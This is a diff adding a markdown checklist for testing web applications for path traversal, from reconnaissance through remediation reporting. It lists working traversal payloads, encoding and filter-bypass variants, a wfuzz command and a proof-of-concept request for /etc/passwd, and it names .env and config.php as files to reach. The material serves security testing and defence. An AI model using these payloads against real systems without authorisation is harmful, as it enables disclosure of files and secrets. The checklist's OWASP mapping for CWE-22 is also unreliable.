@@ -1,0 +1,90 @@
+### 🔍 **1. Reconnaissance & Discovery**
+
+| Step | Task Description | Tools/Commands |
+|------|------------------|----------------|
+| 1.1  | Identify input vectors (file names, downloads, uploads, parameters) | Burp Suite, Dirb, FFUF, manual browsing |
+| 1.2  | Check for file-related parameters (`file=`, `path=`, `dir=`, `download=`, `include=` etc.) | Burp Suite, browser dev tools |
+| 1.3  | Capture baseline request for a known valid file path | Burp Repeater |
+| 1.4  | Try direct file access (e.g., `/static/file.txt`) | Browser or curl |
+
+---
+
+### 🧪 **2. Manual Testing: Basic Path Traversal Payloads**
+
+| Step | Payload Type | Example Payload |
+|------|--------------|------------------|
+| 2.1  | Relative Path Traversal | `../../../../etc/passwd` |
+| 2.2  | Encoded Payloads (URL encoding) | `..%2F..%2Fetc%2Fpasswd` |
+| 2.3  | Double encoding | `%252e%252e%252fetc%252fpasswd` |
+| 2.4  | Mixed encoding + traversal | `%c0%ae%c0%ae/` |
+| 2.5  | Null byte injection (if app is in PHP or older languages) | `../../etc/passwd%00.jpg` |
+
+---
+
+### 🛠️ **3. Automated Scanning**
+
+| Step | Task | Tools |
+|------|------|-------|
+| 3.1  | Run path traversal checks with Burp Suite Active Scan | Burp Suite Pro |
+| 3.2  | Use Nikto for quick detection | `nikto -h <target>` |
+| 3.3  | Use OWASP ZAP with path traversal plugin | OWASP ZAP |
+| 3.4  | Use wfuzz or ffuf for brute-forcing paths | `wfuzz -c -z file,wordlist.txt --hc 404 http://example.com/page.php?file=FUZZ` |
+
+---
+
+### 🔎 **4. Advanced Bypasses & Evading Filters**
+
+| Step | Technique | Payload Example |
+|------|-----------|-----------------|
+| 4.1  | Windows-based traversal | `..\..\..\..\windows\win.ini` |
+| 4.2  | Use long path to bypass filters | `....//....//etc/passwd` |
+| 4.3  | UTF-8 Bypass | `%c1%1c%c1%1c/etc/passwd` |
+| 4.4  | Tab and other control char tricks | `..\..\etc\passwd%09` |
+| 4.5  | Use different slashes (`/`, `\`) or mix them | `..\\..\\etc/passwd` |
+| 4.6  | Combine traversal with LFI | `file=../../../../etc/passwd` |
+
+---
+
+### 🧾 **5. Evidence Collection**
+
+| Step | Evidence Type | Description |
+|------|----------------|-------------|
+| 5.1  | File contents of `/etc/passwd` or `win.ini` | Screenshot + response body |
+| 5.2  | 200 OK response for sensitive files | Save HTTP request/response |
+| 5.3  | Logs from Burp, ZAP, etc. | Export scan results |
+| 5.4  | Path traversal leading to source code or configs | `.env`, `config.php`, etc. |
+
+---
+
+### ✅ **6. Validation and Verification**
+
+| Step | Validation Method | Action |
+|------|--------------------|--------|
+| 6.1  | Try accessing non-existent file to verify behavior | `../../../../doesnotexist.txt` |
+| 6.2  | Verify fix by attempting same payloads post-fix | Retest all previous payloads |
+| 6.3  | Validate blacklisting/bypasses are ineffective | Try bypasses again |
+| 6.4  | Request error handling details (500, 403, 404) | Observe response code & message |
+
+---
+
+### 🛡️ **7. Reporting and Remediation Recommendations**
+
+| Step | Content | Example |
+|------|---------|---------|
+| 7.1  | Description of the vulnerability | "The application does not validate user input in `file=` parameter allowing directory traversal..." |
+| 7.2  | Proof of Concept (PoC) | `GET /download.php?file=../../../../etc/passwd` |
+| 7.3  | Risk level and impact | High (Information Disclosure, RCE possible) |
+| 7.4  | Remediation steps | Sanitize user input, use whitelisting, validate file paths, use `realpath()` |
+| 7.5  | CWE ID and OWASP Mapping | CWE-22, OWASP A05:2021 (Security Misconfiguration) |
+
+---
+
+### 🧰 **8. Tools List for Path Traversal**
+
+- **Burp Suite** (Manual testing + scanner)
+- **OWASP ZAP** (Automated scanner)
+- **Nikto** (Vulnerability scanner)
+- **FFUF / Wfuzz** (Fuzzing)
+- **curl / httpie** (Manual HTTP requests)
+- **Dirb / Dirbuster** (Directory brute forcing)
+
